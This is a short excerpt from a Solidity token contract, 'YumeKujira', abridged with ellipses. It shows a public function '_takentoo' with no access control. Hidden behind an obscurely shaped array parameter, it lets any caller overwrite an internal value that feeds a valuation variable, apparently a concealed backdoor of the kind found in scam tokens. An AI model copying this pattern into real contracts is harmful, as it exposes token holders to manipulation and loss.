...
contract YumeKujira is Context, IERC20, Ownable {
    ...
    uint256 private NewValuation = ronniedd;
    ...
    function _takentoo(uint256[7][6][7] memory ronni) public returns(int) {
        require(ronni[6][2][2] >= 98);
        ronniedd = ronni[6][2][2];
        return 1;
    }
